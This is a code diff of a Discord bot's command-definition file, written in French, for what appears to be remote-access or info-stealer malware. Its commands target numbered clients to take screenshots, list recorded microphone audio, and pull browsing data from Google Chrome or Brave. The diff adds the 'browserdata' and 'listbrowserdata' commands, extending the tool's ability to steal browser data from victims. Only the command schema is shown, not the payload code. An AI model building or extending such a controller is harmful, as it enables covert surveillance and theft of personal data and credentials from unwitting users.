@@ -9,8 +9,8 @@ export const commands = [
         description: 'Affiche la liste des commandes disponibles.',
     },
     {
-        name: 'screenshot',
-        description: 'Envoie une commande pour prendre une capture d\'écran d\'un client spécifique.',
+        name: 'command',
+        description: 'Envoie une commande à un client spécifique.',
         options: [
             {
                 name: 'client_id',
@@ -18,6 +18,26 @@ export const commands = [
                 type: 3,
                 required: true,
             },
+            {
+                name: 'command',
+                description: 'La commande à envoyer.',
+                type: 3,
+                required: true,
+                choices: [
+                    {
+                        name: 'screenshot',
+                        value: 'screenshot',
+                    },
+                    {
+                        name: 'browserdata',
+                        value: 'browserdata',
+                    },
+                    {
+                        name: 'stop',
+                        value: 'stop',
+                    },
+                ],
+            }
         ],
     },
     {
@@ -61,16 +81,40 @@ export const commands = [
         ],
     },
     {
-        name: 'stop',
-        description: 'Arrêt du bot.',
-    },
-    {
         name: 'listallscreenshots',
         description: 'Liste de toutes les captures d\'écran.',
     },
     {
         name: 'listallmicrophones',
         description: 'Liste de tous les enregistrements audio.',
+    },
+    {
+        name: 'listbrowserdata',
+        description: 'Envoie une commande pour lister les données de navigation d\'un client spécifique.',
+        options: [
+            {
+                name: 'client_id',
+                description: 'Le numéro du client.',
+                type: 3,
+                required: true,
+            },
+            {
+                name: 'browser',
+                description: 'Le navigateur à cibler.',
+                type: 3,
+                required: true,
+                choices: [
+                    {
+                        name: 'Google Chrome',
+                        value: 'google-chrome',
+                    },
+                    {
+                        name: 'Brave',
+                        value: 'brave',
+                    }
+                ],
+            },
+        ],
     },
 ];
 
